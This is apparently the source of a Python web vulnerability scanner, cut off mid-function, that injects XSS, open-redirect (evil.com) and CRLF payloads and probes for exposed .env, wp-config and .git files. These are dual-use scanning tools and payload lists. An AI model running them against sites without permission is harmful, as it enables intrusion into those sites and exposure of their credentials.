import requests
import socket
import dns.resolver
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse, quote, unquote
import os
import re
import sys
import time
import select
import threading
import concurrent.futures
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
console = Console()
MAX_WORKERS     = 12
REQUEST_TIMEOUT = 4
PRINT_EVERY     = 12
MAX_CRAWL_PAGES = 20
TAG             = "N0wzy8"
stop_event = threading.Event()
PAYLOADS = [
    f"<script>alert('{TAG}')</script>",
    f"<img src=x onerror=alert('{TAG}')>",
    f"<svg onload=alert('{TAG}')>",
    f"<body onload=alert('{TAG}')>",
    f"<iframe src=javascript:alert('{TAG}')>",
    f"javascript:alert('{TAG}')",
    f"'\"><script>alert('{TAG}')</script>",
    f"\"><img src=x onerror=alert('{TAG}')>",
    f"';alert('{TAG}');//",
    f"\";alert('{TAG}');//",
    f"-->\"><script>alert('{TAG}')</script>",
    f"</script><script>alert('{TAG}')</script>",
    f"</tag><script>alert('{TAG}')</script>",
    f"';}};</style><script>alert('{TAG}')</script>",
    f"<details open ontoggle=alert('{TAG}')>",
    f"<select autofocus onfocus=alert('{TAG}')>",
    f"<textarea autofocus onfocus=alert('{TAG}')>",
    f"<video><source onerror=alert('{TAG}')>",
    f"<audio src=x onerror=alert('{TAG}')>",
    f"<input autofocus onfocus=alert('{TAG}')>",
    f"<form><button formaction=javascript:alert('{TAG}')>X",
    f"<object data=javascript:alert('{TAG}')>",
    f"<embed src=javascript:alert('{TAG}')>",
    f"<div onmouseover=alert('{TAG}')>hover",
    f"<a href=javascript:alert('{TAG}')>click",
    f"<sCrIpT>alert('{TAG}')</sCrIpT>",
    f"<ImG sRc=x OnErRoR=alert('{TAG}')>",
    f"<sVg OnLoAd=alert('{TAG}')>",
    f"<img/src=x onerror=alert('{TAG}')>",
    f"<svg/onload=alert('{TAG}')>",
    f"<img src=x\tonerror=alert('{TAG}')>",
    f"<script/src=x>alert('{TAG}')</script>",
    f"<img src=x onerror=&#97;&#108;&#101;&#114;&#116;('{TAG}')>",
    f"%3Cscript%3Ealert('{TAG}')%3C/script%3E",
    f"\"><img src=1 onerror=alert('{TAG}')>",
    f"'><img src=1 onerror=alert('{TAG}')>",
    f"`><img src=1 onerror=alert('{TAG}')>",
    f"%253Cscript%253Ealert('{TAG}')%253C/script%253E",
    f"<svg><script>alert('{TAG}')</script></svg>",
    f"<svg><animate attributeName=href values=javascript:alert('{TAG}') />",
    f"javascript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert('{TAG}') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('{TAG}')//>",
] + [f"<img src=x id={i} onerror=alert('{TAG}')>" for i in range(1, 15)]
REDIRECT_PAYLOADS_SAFE = [
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
]
REDIRECT_PAYLOADS_EVIL = [
    "https://evil.com", "//evil.com", "///evil.com", "////evil.com",
    "/\\evil.com", "https:evil.com", "//evil.com/%2F..",
    "/%09/evil.com", "/%2F/evil.com", "https://evil.com@trusted.com",
    "//evil%E3%80%82com", "\thttps://evil.com", ".evil.com",
]
REDIRECT_PAYLOADS = REDIRECT_PAYLOADS_SAFE + REDIRECT_PAYLOADS_EVIL
REDIRECT_PARAMS = [
    "redirect", "redirect_to", "redirect_url", "return", "return_to",
    "returnurl", "return_url", "next", "url", "link", "goto", "target",
    "destination", "dest", "go", "continue", "forward", "location",
    "ref", "checkout_url", "out", "view", "path", "callback",
]
CRLF_PAYLOADS = [
    f"%0d%0aX-Injected: {TAG}",
    f"%0aX-Injected: {TAG}",
    f"%0d%0a%0d%0a<script>alert('{TAG}')</script>",
    f"\r\nX-Injected: {TAG}",
    f"%E5%98%8A%E5%98%8DX-Injected: {TAG}",
    f"%0d%0aSet-Cookie: injected={TAG}",
    f"%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert('{TAG}')</script>",
    f"%23%0d%0aX-Injected: {TAG}",
    f"/%0d%0aX-Injected: {TAG}",
]
CORS_TEST_ORIGINS = [
    "https://evil.com",
    "https://attacker.com",
    "null",
]
HTTP_METHODS = ["PUT", "DELETE", "PATCH", "TRACE", "OPTIONS", "HEAD"]
SENSITIVE_PATHS = [
    "/.env", "/.env.local", "/.env.production", "/.env.backup",
    "/config.php", "/config.js", "/config.json", "/config.yml", "/config.yaml",
    "/configuration.php", "/settings.py", "/settings.php", "/local_settings.py",
    "/wp-config.php", "/wp-config.php.bak",
    "/backup.zip", "/backup.tar.gz", "/backup.sql", "/db.sql",
    "/database.sql", "/dump.sql", "/site.zip", "/website.zip",
    "/admin", "/admin/", "/admin.php", "/administrator",
    "/phpmyadmin", "/phpmyadmin/", "/pma/",
    "/wp-admin/", "/wp-login.php",
    "/panel", "/cpanel", "/control",
    "/.git/HEAD", "/.git/config", "/.svn/entries",
    "/.gitignore", "/.htaccess", "/.htpasswd",
    "/error.log", "/access.log", "/debug.log",
    "/logs/error.log", "/log/error.log",
    "/api/", "/api/v1/", "/api/v2/",
    "/api/users", "/api/config", "/api/admin",
    "/swagger.json", "/swagger-ui.html", "/openapi.json",
    "/graphql", "/graphiql",
    "/uploads/", "/files/", "/backup/",
    "/tmp/", "/temp/", "/old/", "/test/",
    "/robots.txt", "/sitemap.xml", "/sitemap_index.xml",
    "/server-status", "/server-info",
    "/info.php", "/phpinfo.php", "/test.php",
    "/.DS_Store", "/Thumbs.db",
    "/crossdomain.xml", "/clientaccesspolicy.xml",
]
SENSITIVE_CONTENT_SIGNATURES = {
    "/.env":            ["DB_", "API_KEY", "SECRET", "PASSWORD", "TOKEN", "APP_"],
    "/.env.local":      ["DB_", "API_KEY", "SECRET", "PASSWORD", "TOKEN"],
    "/.env.production": ["DB_", "API_KEY", "SECRET", "PASSWORD", "TOKEN"],
    "/.git/HEAD":       ["ref:", "refs/"],
    "/.git/config":     ["[core]", "[remote", "url ="],
    "/wp-config.php":   ["DB_NAME", "DB_USER", "DB_PASSWORD", "AUTH_KEY"],
    "/phpinfo.php":     ["phpinfo()", "PHP Version", "php_info"],
    "/info.php":        ["phpinfo()", "PHP Version"],
    "/config.json":     ["{"],
    "/swagger.json":    ["swagger", "openapi", "paths"],
    "/openapi.json":    ["openapi", "paths", "components"],
}
BINARY_SENSITIVE = [".zip", ".tar.gz", ".sql", ".bak", ".backup"]
SECURITY_HEADERS = {
    "Strict-Transport-Security": "HSTS missing — vulnerable to HTTP downgrade attack",
    "X-Frame-Options":           "No clickjacking protection",
    "X-Content-Type-Options":    "No MIME-sniffing protection",
    "Content-Security-Policy":   "No CSP — increases XSS risk",
    "X-XSS-Protection":          "Browser XSS filter disabled",
    "Referrer-Policy":           "Referrer information may be leaking",
    "Permissions-Policy":        "Permissions policy not defined",
}
TECH_SIGNATURES = {
    "WordPress":    ["/wp-content/", "/wp-includes/", "wp-json"],
    "Drupal":       ["Drupal.settings", "/sites/default/", "drupal.js"],
    "Joomla":       ["/components/com_", "Joomla!", "/media/jui/"],
    "Laravel":      ["laravel_session", "XSRF-TOKEN", "laravel"],
    "Django":       ["csrfmiddlewaretoken", "__admin__", "Django"],
    "React":        ["__REACT_DEVTOOLS", "react-root", "_reactFiber"],
    "Angular":      ["ng-version", "ng-app", "angular.js"],
    "Vue.js":       ["__vue__", "vue-router", "vuex"],
    "jQuery":       ["jquery.min.js", "jQuery v", "jquery-"],
    "Bootstrap":    ["bootstrap.min.css", "bootstrap.js"],
    "Nginx":        ["nginx"],
    "Apache":       ["Apache", "mod_"],
    "IIS":          ["Microsoft-IIS", "X-Powered-By: ASP"],
    "PHP":          ["X-Powered-By: PHP", ".php"],
    "ASP.NET":      ["ASP.NET", "__VIEWSTATE", "X-AspNet-Version"],
    "Node.js":      ["X-Powered-By: Express", "connect.sid"],
    "Cloudflare":   ["cf-ray", "cloudflare", "__cfduid"],
}
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive",
}
STATUS_STYLE = {
    "CRITICAL": "[bold green]  CRITICAL  [/bold green]",
    "BLOCKED":  "[bold orange3]  BLOCKED   [/bold orange3]",
    "SECURE":   "[bold red]   SECURE   [/bold red]",
    "TIMEOUT":  "[bold white]  TIMEOUT   [/bold white]",
    "FOUND":    "[bold green]   FOUND    [/bold green]",
    "INFO":     "[bold cyan]    INFO    [/bold cyan]",
}
thread_local = threading.local()
def get_session():
    if not hasattr(thread_local, "session"):
        s = requests.Session()
        s.headers.update(HEADERS)
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=2, pool_maxsize=MAX_WORKERS, max_retries=0
        )
        s.mount("http://", adapter)
        s.mount("https://", adapter)
        thread_local.session = s
    return thread_local.session
def keyboard_listener():
    console.print("[dim]  → Press 't' + Enter to stop.[/dim]")
    while not stop_event.is_set():
        try:
            if sys.platform == "win32":
                import msvcrt
                if msvcrt.kbhit():
                    ch = msvcrt.getwch()
                    if ch.lower() == "t":
                        stop_event.set()
                        break
                time.sleep(0.1)
            else:
                rlist, _, _ = select.select([sys.stdin], [], [], 0.2)
                if rlist:
                    ch = sys.stdin.readline().strip().lower()
                    if ch == "t":
                        stop_event.set()
                        break
        except Exception:
            break
def get_baseline_fingerprint(session, base_url):
    fingerprints = {}
    try:
        r404 = session.get(base_url + "/this_path_definitely_does_not_exist_xyzabc123", timeout=REQUEST_TIMEOUT)
        fingerprints["404_status"]   = r404.status_code
        fingerprints["404_len"]      = len(r404.text)
        fingerprints["404_fragment"] = r404.text[:300] if r404.text else ""
    except Exception:
        fingerprints["404_status"]   = None
        fingerprints["404_len"]      = 0
        fingerprints["404_fragment"] = ""
    try:
        r_home = session.get(base_url, timeout=REQUEST_TIMEOUT)
        fingerprints["home_len"]      = len(r_home.text)
        fingerprints["home_fragment"] = r_home.text[:300] if r_home.text else ""
    except Exception:
        fingerprints["home_len"]      = 0
        fingerprints["home_fragment"] = ""
    return fingerprints
def is_soft_404(response_text, response_len, fingerprints, threshold=0.92):
    for key in ("404_len", "home_len"):
        base_len = fingerprints.get(key, 0)
        if base_len > 0:
            ratio = min(response_len, base_len) / max(response_len, base_len)
            if ratio >= threshold:
                return True
    for key in ("404_fragment", "home_fragment"):
        frag = fingerprints.get(key, "")
        if frag and response_text[:300] == frag:
            return True
    return False
def is_real_sensitive_file(path, response_text, content_type, response_len, fingerprints):
    if is_soft_404(response_text, response_len, fingerprints):
        return False, "soft-404"
    if any(path.endswith(ext) for ext in BINARY_SENSITIVE):
        ct = content_type.lower()
        if any(x in ct for x in ["zip", "sql", "octet-stream", "x-tar", "gzip"]):
            return True, "binary content-type matched"
        return False, "content-type mismatch"
    signatures = SENSITIVE_CONTENT_SIGNATURES.get(path)
    if signatures:
        body_lower = response_text.lower()
        matched = [sig for sig in signatures if sig.lower() in body_lower]
        if matched:
            return True, f"signature: {matched[:2]}"
        return False, "signature not found"
    return False, "could not verify"
def detect_technologies(response, html_text):
    detected = []
    headers_str = str(response.headers).lower()
    html_lower  = html_text.lower()
    for tech, signs in TECH_SIGNATURES.items():
        for sign in signs:
            if sign.lower() in headers_str or sign.lower() in html_lower:
                detected.append(tech)
                break
    server = response.headers.get("Server", "")
    powered = response.headers.get("X-Powered-By", "")
    return detected, server, powered
COMMON_SUBDOMAINS = [
    "www", "mail", "ftp", "admin", "api", "dev", "test", "staging",
    "blog", "shop", "store", "app", "m", "mobile", "secure", "portal",
    "vpn", "remote", "cdn", "static", "assets", "media", "images",
    "beta", "demo", "old", "new", "docs", "help", "support",
    "dashboard", "panel", "cpanel", "webmail", "smtp", "pop", "imap",
]
def check_subdomains(domain):
    found = []
    base = ".".join(domain.split(".")[-2:])
    console.print(f"[dim]  → Checking {len(COMMON_SUBDOMAINS)} subdomains...[/dim]")
    def check_sub(sub):
        target = f"{sub}.{base}"
        try:
            answers = dns.resolver.resolve(target, "A", lifetime=2)
            ips = [r.address for r in answers]
            return (target, ips)
        except Exception:
            return None
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
        results = list(ex.map(check_sub, COMMON_SUBDOMAINS))
    for r in results:
        if r:
            hostname, ips = r
            found.append((hostname, ips))
            console.print(f"  [bold cyan]SUB[/bold cyan] [white]{hostname}[/white] → [dim]{', '.join(ips)}[/dim]")
    return found
def test_cors(url, session):
    findings = []
    for origin in CORS_TEST_ORIGINS:
        try:
            r = session.get(url, headers={"Origin": origin}, timeout=REQUEST_TIMEOUT)
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials", "")
            if (acao == origin or acao == "*") and acac.lower() == "true":
                findings.append(("CORS-CRITICAL", url, origin, f"ACAO={acao}, ACAC={acac}"))
                console.print(f"  [bold green][!] CORS CRITICAL: Origin={origin} → ACAO={acao}, credentials=true[/bold green]")
            elif acao == origin:
                findings.append(("CORS-MEDIUM", url, origin, f"ACAO={acao}"))
                console.print(f"  [bold yellow][!] CORS: Origin reflected: {origin} → {acao}[/bold yellow]")
            elif acao == "*":
                findings.append(("CORS-LOW", url, origin, "Wildcard ACAO"))
        except Exception:
            pass
    return findings
def test_clickjacking(url, response_headers):
    xfo = response_headers.get("X-Frame-Options", "")
    csp = response_headers.get("Content-Security-Policy", "")
    if not xfo and "frame-ancestors" not in csp.lower():
        return True
    return False
def test_http_methods(url, session):
    findings = []
    for method in HTTP_METHODS:
        try:
            r = session.request(method, url, timeout=REQUEST_TIMEOUT)
            if r.status_code not in (405, 501, 403):
                findings.append((method, r.status_code))
                if method == "TRACE" and r.status_code == 200:
                    console.print(f"  [bold green][!] TRACE enabled! Cross-Site Tracing risk[/bold green]")
                elif method in ("PUT", "DELETE") and r.status_code < 400:
                    console.print(f"  [bold yellow][!] {method} method accepted ({r.status_code})[/bold yellow]")
        except Exception:
            pass
    return findings
def test_rate_limit(url, session):
    results = []
    try:
        for i in range(15):
            r = session.get(url, timeout=REQUEST_TIMEOUT)
            results.append(r.status_code)
            if r.status_code == 429:
                console.print(f"  [green]✓ Rate limiting active (429 on request {i+1})[/green]")
                return True, i + 1
    except Exception:
        pass
    console.print(f"  [yellow]! Rate limiting not detected (15 requests, all {set(results)})[/yellow]")
    return False, 15
def extract_emails_and_info(html_text, url):
    findings = []
    email_re = re.compile(r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}')
    phone_re = re.compile(r'[\+\(]?[0-9][0-9\s\-\(\)]{7,}[0-9]')
    comment_re = re.compile(r'<!--(.*?)-->', re.DOTALL)
    emails = list(set(email_re.findall(html_text)))
    for email in emails:
        if not email.endswith(('.png', '.jpg', '.gif', '.css', '.js')):
            findings.append(("EMAIL", email, url))
    comments = comment_re.findall(html_text)
    for comment in comments:
        comment = comment.strip()
        if len(comment) > 10 and any(k in comment.lower() for k in
           ["todo", "fixme", "hack", "password", "key", "secret", "debug", "test", "admin"]):
            findings.append(("HTML-COMMENT", comment[:100], url))
    return findings
def crawl_links(base_url, session):
    visited  = set()
    to_visit = [base_url]
    found    = []
    domain   = urlparse(base_url).netloc
    while to_visit and len(visited) < MAX_CRAWL_PAGES:
        url = to_visit.pop(0)
        if url in visited:
            continue
        visited.add(url)
        try:
            r    = session.get(url, timeout=REQUEST_TIMEOUT)
            soup = BeautifulSoup(r.text, "html.parser")
            found.append((url, r.text, soup, r))
            for a in soup.find_all("a", href=True):
                href = urljoin(url, a["href"])
                p    = urlparse(href)
                if p.netloc == domain and href not in visited and p.scheme in ("http", "https"):
                    clean = urlunparse((p.scheme, p.netloc, p.path, p.params, p.query, ""))
                    to_visit.append(clean)
        except Exception:
            pass
    return found
def extract_js_params(html_text, base_url):
    tasks  = []
    domain = urlparse(base_url).netloc
    url_re = re.compile(r'''["'`]((?:https?://[^"'`\s]+|/[^"'`\s]+\?[^"'`\s]+))["'`]''')
    par_re = re.compile(r'[?&]([a-zA-Z_][a-zA-Z0-9_\-]{0,30})=')
    soup   = BeautifulSoup(html_text, "html.parser")
    for s in soup.find_all("script"):
        if not s.string:
            continue
        for match in url_re.findall(s.string):
            full = match if match.startswith("http") else urljoin(base_url, match)
            if urlparse(full).netloc == domain:
                for p in par_re.findall(urlparse(full).query):
                    for pl in PAYLOADS:
                        tasks.append((full, "GET", p, pl, "JS-PARAM"))
    return tasks
def test_xss(url, method, param, payload, source):
    if stop_event.is_set():
        return None
    short_pl = payload[:40] + "..." if len(payload) > 40 else payload
    session  = get_session()
    try:
        if method == "GET":
            parsed     = urlparse(url)
            qp         = parse_qs(parsed.query)
            base_query = urlencode({k: v for k, v in qp.items() if k != param}, doseq=True)
            pl_part    = f"{quote(param, safe='')}={quote(payload, safe='')}"
            new_query  = f"{base_query}&{pl_part}" if base_query else pl_part
            test_url   = parsed._replace(query=new_query).geturl()
            r          = session.get(test_url, timeout=REQUEST_TIMEOUT)
            check_url  = test_url
        elif method == "POST":
            r         = session.post(url, data={param: payload}, timeout=REQUEST_TIMEOUT)
            check_url = url
        elif method == "HEADER":
            r         = session.get(url, headers={param: payload}, timeout=REQUEST_TIMEOUT)
            check_url = url
        elif method == "COOKIE":
            r         = session.get(url, cookies={param: payload}, timeout=REQUEST_TIMEOUT)
            check_url = url
        else:
            return ("XSS", method, param, short_pl, "SECURE", None, source)
        found = payload in r.text or unquote(payload) in r.text
        if found:
            if r.status_code in [403, 406]:
                return ("XSS", method, param, short_pl, "BLOCKED", None, source)
            return ("XSS", method, param, short_pl, "CRITICAL", check_url, source)
        return ("XSS", method, param, short_pl, "SECURE", None, source)
    except Exception:
        return ("XSS", method, param, short_pl, "TIMEOUT", None, source)
def test_redirect(base_url, param, payload):
    if stop_event.is_set():
        return None
    session       = get_session()
    short_pl      = payload[:40]
    origin_domain = urlparse(base_url).netloc
    try:
        parsed    = urlparse(base_url)
        qp        = parse_qs(parsed.query)
        qp[param] = payload
        test_url  = parsed._replace(query=urlencode(qp, doseq=True)).geturl()
        r = session.get(test_url, timeout=REQUEST_TIMEOUT, allow_redirects=False)
        if r.status_code not in (301, 302, 303, 307, 308):
            return ("REDIRECT", "GET", param, short_pl, "SECURE", None, "REDIRECT")
        location   = r.headers.get("Location", "")
        loc_domain = urlparse(location).netloc
        if "evil.com" in location:
            return ("REDIRECT", "GET", param, short_pl, "CRITICAL", test_url, "REDIRECT")
        if location.lower().startswith(("javascript:", "data:")):
            return ("REDIRECT", "GET", param, short_pl, "CRITICAL", test_url, "REDIRECT")
        if loc_domain and loc_domain != origin_domain:
            return ("REDIRECT", "GET", param, short_pl, "CRITICAL", test_url, "REDIRECT")
        return ("REDIRECT", "GET", param, short_pl, "SECURE", None, "REDIRECT")
    except Exception:
        return ("REDIRECT", "GET", param, short_pl, "TIMEOUT", None, "REDIRECT")
def test_crlf(base_url, param, payload):
    if stop_event.is_set():
        return None
    session  = get_session()
    short_pl = payload[:40]
    try:
        parsed    = urlparse(base_url)
        qp        = parse_qs(parsed.query)
        qp[param] = payload
        test_url  = parsed._replace(query=urlencode(qp, doseq=True)).geturl()
        r         = session.get(test_url, timeout=REQUEST_TIMEOUT, allow_redirects=False)
        raw_hdrs  = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        if "X-Injected" in raw_hdrs or f"injected={TAG}" in raw_hdrs or TAG in raw_hdrs:
            return ("CRLF", "GET", param, short_pl, "CRITICAL", test_url, "CRLF")
        return ("CRLF", "GET", param, short_pl, "SECURE", None, "CRLF")
    except Exception:
        return ("CRLF", "GET", param, short_pl, "TIMEOUT", None, "CRLF")
def run_recon(target, session, fingerprints):
    base     = urlparse(target)
    base_url = f"{base.scheme}://{base.netloc}"
    domain   = base.netloc.split(":")[0]
    findings = []
    extra    = {}
    console.print("\n[bold cyan][*] Starting recon...[/bold cyan]")
    console.print("[dim]  → Checking HTTP security headers...[/dim]")
    try:
        r = session.get(target, timeout=REQUEST_TIMEOUT)
        techs, server, powered = detect_technologies(r, r.text)
        extra["techs"]   = techs
        extra["server"]  = server
        extra["powered"] = powered
        if techs:
            console.print(f"  [bold cyan][i] Technology: {', '.join(techs)}[/bold cyan]")
        if server:
            console.print(f"  [bold cyan][i] Server: {server}[/bold cyan]")
        if test_clickjacking(target, r.headers):
            findings.append(("CLICKJACKING", target, "X-Frame-Options missing, no frame-ancestors", target))
            console.print(f"  [bold yellow][!] Clickjacking vulnerability: X-Frame-Options missing[/bold yellow]")
        missing = []
        for hdr, desc in SECURITY_HEADERS.items():
            if hdr.lower() not in {k.lower() for k in r.headers}:
                missing.append((hdr, desc))
                findings.append(("HEADER-MISSING", hdr, desc, target))
        if missing:
            console.print(f"  [bold yellow][!] {len(missing)} security headers missing:[/bold yellow]")
            for hdr, desc in missing:
                console.print(f"      [yellow]✗ {hdr:<35}[/yellow] [dim]{desc}[/dim]")
        else:
            console.print("  [green]✓ All security headers present[/green]")
        console.print("[dim]  → Checking cookie security flags...[/dim]")
        for cookie in r.cookies:
            issues = []
            if not cookie.has_nonstandard_attr("HttpOnly") and "httponly" not in str(cookie).lower():
                issues.append("HttpOnly missing")
            if not cookie.secure:
                issues.append("Secure missing")
            if not cookie.has_nonstandard_attr("SameSite"):
                issues.append("SameSite missing")
            if issues:
                findings.append(("COOKIE-FLAG", cookie.name, ", ".join(issues), target))
                console.print(f"  [yellow][!] Cookie '{cookie.name}': {', '.join(issues)}[/yellow]")
        leaks = extract_emails_and_info(r.text, target)
        for leak_type, data, url in leaks:
            findings.append((f"LEAK-{leak_type}", data, url, target))
            if leak_type == "EMAIL":
                console.print(f"  [yellow][i] Email found: {data}[/yellow]")
            elif leak_type == "HTML-COMMENT":
                console.print(f"  [yellow][i] Suspicious HTML comment: {data[:60]}[/yellow]")
    except Exception as e:
        console.print(f"  [red][!] Header check failed: {e}[/red]")
    console.print("[dim]  → Testing CORS policy...[/dim]")
    cors_findings = test_cors(target, session)
    findings.extend(cors_findings)
    if not cors_findings:
        console.print("  [green]✓ CORS policy appears secure[/green]")
    console.print("[dim]  → Testing HTTP methods...[/dim]")
    method_findings = test_http_methods(target, session)
    for method, code in method_findings:
        findings.append(("HTTP-METHOD", method, str(code), target))
    if not method_findings:
        console.print("  [green]✓ No dangerous HTTP methods accepted[/green]")
    console.print("[dim]  → Testing rate limiting...[/dim]")
    rate_ok, count = test_rate_limit(target, session)
    findings.append(("RATE-LIMIT", "active" if rate_ok else "missing", str(count), target))
    console.print("[dim]  → Subdomain scan...[/dim]")
    try:
        sub_findings = check_subdomains(domain)
        extra["subdomains"] = sub_findings
        for sub, ips in sub_findings:
            findings.append(("SUBDOMAIN", sub, ", ".join(ips), target))
    except Exception:
        extra["subdomains"] = []
    console.print(f"[dim]  → Scanning {len(SENSITIVE_PATHS)} sensitive paths (with signature verification)...[/dim]")
    def check_path(path):
        url = base_url.rstrip("/") + path
        try:
            r = session.get(url, timeout=REQUEST_TIMEOUT, allow_redirects=False)
            if r.status_code in (301, 302, 307, 308):
                return None
            if r.status_code == 403:
                return ("403", url, path, len(r.content), "Access denied")
            if r.status_code == 200:
                ct   = r.headers.get("Content-Type", "")
                body = r.text
                size = len(r.content)
                real, reason = is_real_sensitive_file(path, body, ct, size, fingerprints)
                if real:
                    return ("200", url, path, size, reason)
                return ("FP", url, path, size, reason)
        except Exception:
            pass
        return None
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
        futures = {ex.submit(check_path, p): p for p in SENSITIVE_PATHS}
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if not result:
                continue
            code, url, path, size, reason = result
            if code == "200":
                console.print(f"  [bold green]200 OPEN  [/bold green] [white]{url}[/white] [dim]({size}b — {reason})[/dim]")
                findings.append(("SENSITIVE-FILE", url, reason, target))
            elif code == "403":
                console.print(f"  [bold yellow]403 FORBIDDEN[/bold yellow] [dim]{url}[/dim]")
                findings.append(("SENSITIVE-FILE-403", url, "Access denied", target))
    console.print("[dim]  → Checking directory listing...[/dim]")
    for path in ["/uploads/", "/files/", "/backup/", "/images/", "/static/", "/assets/"]:
        try:
            r = session.get(base_url + path, timeout=REQUEST_TIMEOUT)
            if r.status_code == 200 and any(k in r.text.lower() for k in
               ["index of", "parent directory", "last modified", "[dir]"]):
                findings.append(("DIR-LISTING", base_url + path, "Directory listing open!", target))
                console.print(f"  [bold green][!] DIRECTORY LISTING OPEN: {base_url + path}[/bold green]")
        except Exception:
            pass
    return findings, extra
def save_report(target, recon_findings, extra, all_findings, completed, total, elapsed_total, pages_count, task_counts):
    domain   = urlparse(target).netloc.replace(":", "_")
    filename = f"{domain}.txt"
    lines    = []
    sep      = "=" * 72
    lines += [sep, "  N0WZY8 SCANNER — SCAN REPORT", sep,
              f"Target       : {target}",
              f"Date         : {time.strftime('%Y-%m-%d %H:%M:%S')}",
              f"Duration     : {elapsed_total:.1f} seconds",
              f"Speed        : {completed / elapsed_total:.1f} req/s", ""]
    lines.append("── TECHNOLOGY " + "─" * 58)
    lines.append(f"Detected     : {', '.join(extra.get('techs', [])) or 'Unknown'}")
    lines.append(f"Server       : {extra.get('server', '-')}")
    lines.append(f"X-Powered-By : {extra.get('powered', '-')}")
    lines.append("")
    subs = extra.get("subdomains", [])
    lines.append("── SUBDOMAINS " + "─" * 58)
    lines.append(f"Found: {len(subs)}")
    for sub, ips in subs:
        lines.append(f"  {sub} → {', '.join(ips)}")
    lines.append("")
    lines.append("── SCAN SUMMARY " + "─" * 56)
    lines.append(f"Pages crawled  : {pages_count}")
    lines.append(f"Total tests    : {total}")
    lines.append(f"Completed      : {completed}")
    lines.append(f"Sensitive paths: {len(SENSITIVE_PATHS)}")
    for src, cnt in sorted(task_counts.items(), key=lambda x: -x[1]):
        lines.append(f"  {src:<14}: {cnt} tests")
    lines.append("")
    header_issues = [f for f in recon_findings if f[0] == "HEADER-MISSING"]
    lines.append("── SECURITY HEADERS " + "─" * 52)
    if header_issues:
        lines.append(f"Missing headers: {len(header_issues)}")
        for _, hdr, desc, _ in header_issues:
            lines.append(f"  ✗ {hdr:<35} — {desc}")
    else:
        lines.append("  ✓ All security headers present")
    lines.append("")
    cj = [f for f in recon_findings if f[0] == "CLICKJACKING"]
    if cj:
        lines.append("── CLICKJACKING " + "─" * 56)
        lines.append("  [!] Clickjacking vulnerability detected!")
        lines.append("")
    cors = [f for f in recon_findings if "CORS" in f[0]]
    if cors:
        lines.append("── CORS MISCONFIGURATION " + "─" * 48)
        for typ, url, origin, desc in cors:
            lines.append(f"  [{typ}] origin={origin} — {desc}")
        lines.append("")
    methods = [f for f in recon_findings if f[0] == "HTTP-METHOD"]
    if methods:
        lines.append("── DANGEROUS HTTP METHODS " + "─" * 47)
        for _, method, code, _ in methods:
            lines.append(f"  {method} → HTTP {code}")
        lines.append("")
    rl = [f for f in recon_findings if f[0] == "RATE-LIMIT"]
    if rl:
        _, status, count, _ = rl[0]
        lines.append("── RATE LIMITING " + "─" * 55)
        lines.append(f"  Status: {status} ({count} requests tested)")
        lines.append("")
    cookie_issues = [f for f in recon_findings if f[0] == "COOKIE-FLAG"]
    if cookie_issues:
        lines.append("── COOKIE ISSUES " + "─" * 55)
        for _, name, desc, _ in cookie_issues:
            lines.append(f"  ! Cookie '{name}': {desc}")
        lines.append("")
    leaks = [f for f in recon_findings if f[0].startswith("LEAK-")]
    if leaks:
        lines.append("── DATA LEAKAGE " + "─" * 56)
        for typ, data, url, _ in leaks:
            lines.append(f"  [{typ}] {data}")
        lines.append("")
    sensitive     = [f for f in recon_findings if f[0] == "SENSITIVE-FILE"]
    sensitive_403 = [f for f in recon_findings if f[0] == "SENSITIVE-FILE-403"]
    dir_listing   = [f for f in recon_findings if f[0] == "DIR-LISTING"]
    lines.append("── SENSITIVE FILE SCAN " + "─" * 49)
    lines.append(f"Queried        : {len(SENSITIVE_PATHS)}")
    lines.append(f"Open (200)     : {len(sensitive)}")
    lines.append(f"Forbidden (403): {len(sensitive_403)}")
    lines.append(f"Dir listing    : {len(dir_listing)}")
    if sensitive:
        lines.append("\n  [!] OPEN FILES:")
        for _, url, reason, _ in sensitive:
            lines.append(f"      {url}  ({reason})")
    if dir_listing:
        lines.append("\n  [!] DIRECTORY LISTING:")
        for _, url, _, _ in dir_listing:
            lines.append(f"      {url}")
    lines.append("")
    by_type = {}
    for f in all_findings:
        by_type.setdefault(f[0], []).append(f)
    lines.append("── ACTIVE VULNERABILITY FINDINGS " + "─" * 40)
    if not all_findings:
        lines.append("  No active vulnerabilities detected.")
    else:
        for typ, items in by_type.items():
            deduped = list({u: (t, s, u, p, pl) for t, s, u, p, pl in items}.values())
            lines.append(f"\n  [{typ}] — {len(deduped)} unique findings")
            for idx, (t, src, url, param, pl) in enumerate(deduped, 1):
                lines.append(f"    [{idx}] source={src}  param={param}")
                lines.append(f"         {url}")
                lines.append(f"         payload: {pl}")
    lines += ["", sep]
    with open(filename, "w", encoding="utf-8") as f:
        f.write("\n".join(lines))
    console.print(f"\n[bold green][+] Report saved → [white]{filename}[/white][/bold green]")
    return filename
def print_report(recon_findings, extra, all_findings, completed, total, elapsed_total):
    console.print("\n" + "═" * 72)
    console.print("[bold white]  SCAN REPORT[/bold white]")
    console.print("═" * 72)
    console.print(f"[dim]Completed: {completed}/{total} tests[/dim]")
    techs = extra.get("techs", [])
    if techs:
        console.print(f"\n[bold cyan][i] Technology:[/bold cyan] {', '.join(techs)}")
    subs = extra.get("subdomains", [])
    if subs:
        console.print(Panel(
